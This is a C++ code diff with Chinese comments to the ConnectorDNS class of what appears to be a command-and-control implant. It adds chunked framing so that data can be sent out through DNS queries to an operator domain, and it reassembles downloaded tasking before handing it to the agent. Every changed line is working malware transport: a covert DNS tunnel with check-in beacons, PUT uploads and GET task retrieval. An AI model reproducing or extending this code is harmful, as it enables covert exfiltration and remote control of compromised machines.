@@ -442,101 +442,195 @@ void ConnectorDNS::CloseConnector()
         this->hiBeat = NULL;
         this->hiBeatSize = 0;
     }
+    if (this->downBuf && this->downTotal) {
+        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+        this->downBuf    = NULL;
+        this->downTotal  = 0;
+        this->downFilled = 0;
+    }
 }
 
 void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 {
-	// maximum payload per query, bounded by configured pktSize and actual data_size
-	ULONG maxBuf = this->pktSize ? this->pktSize : 1024;
-	if (data_size && maxBuf > data_size)
-		maxBuf = data_size;
+    // base packet size used for DNS frames
+    ULONG pkt = this->pktSize ? this->pktSize : 1024;
+    if (pkt > 64000)
+        pkt = 64000;
 
-	CHAR dataLabel[1024];
-	memset(dataLabel, 0, sizeof(dataLabel));
-	CHAR qname[512];
-	memset(qname, 0, sizeof(qname));
+    CHAR dataLabel[1024];
+    memset(dataLabel, 0, sizeof(dataLabel));
+    CHAR qname[512];
+    memset(qname, 0, sizeof(qname));
 
-	// HI：第一次带 beat 的调用
-	if (!this->hiSent && data && data_size) {
-		BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
-		if (!encBuf)
-			return;
-		memcpy(encBuf, data, maxBuf);
-		if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
-			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
-			return;
-		}
-		MemFreeLocal((LPVOID*)&encBuf, maxBuf);
+    // HI：第一次带 beat 的调用仍然沿用原始打包方式（不做应用层分片），
+    // 以保持与现有 TsAgentCreate / beat 解析逻辑完全兼容。
+    if (!this->hiSent && data && data_size) {
+        ULONG maxBuf = pkt;
+        if (data_size && maxBuf > data_size)
+            maxBuf = data_size;
+        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
+        if (!encBuf)
+            return;
+        memcpy(encBuf, data, maxBuf);
+        if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
+            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
+            return;
+        }
+        MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 
-		BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-		BYTE tmp[512];
-		ULONG tmpSize = 0;
-		if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
-			this->hiSent = TRUE;
-		} else if (this->hiRetries > 0) {
-			this->hiRetries--;
-		}
-		return;
-	}
+        BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        BYTE tmp[512];
+        ULONG tmpSize = 0;
+        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+            this->hiSent = TRUE;
+        } else if (this->hiRetries > 0) {
+            this->hiRetries--;
+        }
+        return;
+    }
 
-	// 之后所有有数据的调用视为 PUT
-	if (data && data_size) {
-		BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
-		if (!encBuf)
-			return;
-		memcpy(encBuf, data, maxBuf);
-		// 此处数据已由上层用 SessionKey RC4 过，不再额外加密，直接 base32 编码
-		if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
-			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
-			return;
-		}
-		MemFreeLocal((LPVOID*)&encBuf, maxBuf);
+    // 之后所有有数据的调用视为 PUT，使用应用层分片：
+    // frame = [4 bytes total_len][4 bytes offset][chunk...]
+    if (data && data_size) {
+        const ULONG headerSize = 8;
+        ULONG total = data_size;
+        ULONG maxChunk = pkt;
+        if (maxChunk <= headerSize)
+            maxChunk = headerSize + 1;
+        maxChunk -= headerSize;
 
-		BuildQName(this->sid, "PUT", ++this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-		BYTE tmp[512];
-		ULONG tmpSize = 0;
-		DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
-		return;
-	}
+        // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
+        const ULONG maxUploadSize = 1 << 20;
+        if (total > maxUploadSize)
+            total = maxUploadSize;
 
-	// 空数据：GET 下行任务
-	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
-		// 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
-		ULONG retrySize = this->hiBeatSize;
-		if (retrySize > maxBuf)
-			retrySize = maxBuf;
-		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
-		if (!encBuf)
-			return;
-		memcpy(encBuf, this->hiBeat, retrySize);
-		if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
-			MemFreeLocal((LPVOID*)&encBuf, retrySize);
-			return;
-		}
-		MemFreeLocal((LPVOID*)&encBuf, retrySize);
+        ULONG offset = 0;
+        while (offset < total) {
+            ULONG chunk = total - offset;
+            if (chunk > maxChunk)
+                chunk = maxChunk;
 
-		BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-		BYTE tmp[512];
-		ULONG tmpSize = 0;
-		if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
-			this->hiSent = TRUE;
-		} else {
-			if (this->hiRetries > 0)
-				this->hiRetries--;
-		}
-		return;
-	}
+            ULONG frameSize = headerSize + chunk;
+            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
+            if (!frame)
+                return;
 
-	BuildQName(this->sid, "GET", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
-	BYTE respBuf[1024];
-	ULONG respSize = 0;
-	if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
-		this->recvData = (BYTE*)MemAllocLocal(respSize);
-		if (!this->recvData)
-			return;
-		memcpy(this->recvData, respBuf, respSize);
-		this->recvSize = (int)respSize;
-	}
+            // total_len (big-endian)
+            frame[0] = (BYTE)((total >> 24) & 0xFF);
+            frame[1] = (BYTE)((total >> 16) & 0xFF);
+            frame[2] = (BYTE)((total >> 8) & 0xFF);
+            frame[3] = (BYTE)((total >> 0) & 0xFF);
+            // offset (big-endian)
+            frame[4] = (BYTE)((offset >> 24) & 0xFF);
+            frame[5] = (BYTE)((offset >> 16) & 0xFF);
+            frame[6] = (BYTE)((offset >> 8) & 0xFF);
+            frame[7] = (BYTE)((offset >> 0) & 0xFF);
+            memcpy(frame + headerSize, data + offset, chunk);
+
+            memset(dataLabel, 0, sizeof(dataLabel));
+            if (!BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+                MemFreeLocal((LPVOID*)&frame, frameSize);
+                return;
+            }
+            MemFreeLocal((LPVOID*)&frame, frameSize);
+
+            BuildQName(this->sid, "PUT", ++this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+            BYTE tmp[512];
+            ULONG tmpSize = 0;
+            DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+
+            offset += chunk;
+        }
+        return;
+    }
+
+    // 空数据：GET 下行任务；在未完成首 HI 时优先执行智能 HI 重试。
+    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+        ULONG maxBuf = pkt;
+        // 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
+        ULONG retrySize = this->hiBeatSize;
+        if (retrySize > maxBuf)
+            retrySize = maxBuf;
+        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
+        if (!encBuf)
+            return;
+        memcpy(encBuf, this->hiBeat, retrySize);
+        if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+            MemFreeLocal((LPVOID*)&encBuf, retrySize);
+            return;
+        }
+        MemFreeLocal((LPVOID*)&encBuf, retrySize);
+
+        BuildQName(this->sid, "HI", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+        BYTE tmp[512];
+        ULONG tmpSize = 0;
+        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+            this->hiSent = TRUE;
+        } else {
+            if (this->hiRetries > 0)
+                this->hiRetries--;
+        }
+        return;
+    }
+
+    // 正常 GET：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
+    // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
+    BuildQName(this->sid, "GET", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+    BYTE respBuf[1024];
+    ULONG respSize = 0;
+    if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
+        const ULONG headerSize = 8;
+        // 新协议：带有 [total_len][offset] 头部
+        if (respSize > headerSize) {
+            ULONG total = 0;
+            ULONG offset = 0;
+            total |= ((ULONG)respBuf[0] << 24);
+            total |= ((ULONG)respBuf[1] << 16);
+            total |= ((ULONG)respBuf[2] << 8);
+            total |= ((ULONG)respBuf[3] << 0);
+            offset |= ((ULONG)respBuf[4] << 24);
+            offset |= ((ULONG)respBuf[5] << 16);
+            offset |= ((ULONG)respBuf[6] << 8);
+            offset |= ((ULONG)respBuf[7] << 0);
+            ULONG chunkLen = respSize - headerSize;
+            const ULONG maxDownloadSize = 1 << 20;
+            if (total > 0 && total <= maxDownloadSize && offset < total) {
+                if (!this->downBuf || this->downTotal != total) {
+                    if (this->downBuf && this->downTotal) {
+                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                    }
+                    this->downBuf = (BYTE*)MemAllocLocal(total);
+                    if (!this->downBuf) {
+                        this->downTotal  = 0;
+                        this->downFilled = 0;
+                        return;
+                    }
+                    this->downTotal  = total;
+                    this->downFilled = 0;
+                }
+                ULONG end = offset + chunkLen;
+                if (end > total)
+                    end = total;
+                ULONG n = end - offset;
+                memcpy(this->downBuf + offset, respBuf + headerSize, n);
+                this->downFilled += n;
+                if (this->downFilled >= this->downTotal) {
+                    this->recvData = this->downBuf;
+                    this->recvSize = (int)this->downTotal;
+                    this->downBuf    = NULL;
+                    this->downTotal  = 0;
+                    this->downFilled = 0;
+                }
+                return;
+            }
+        }
+        // 兼容旧协议：无头部时视为完整单包，直接交给上层。
+        this->recvData = (BYTE*)MemAllocLocal(respSize);
+        if (!this->recvData)
+            return;
+        memcpy(this->recvData, respBuf, respSize);
+        this->recvSize = (int)respSize;
+    }
 }
 
 BYTE* ConnectorDNS::RecvData()
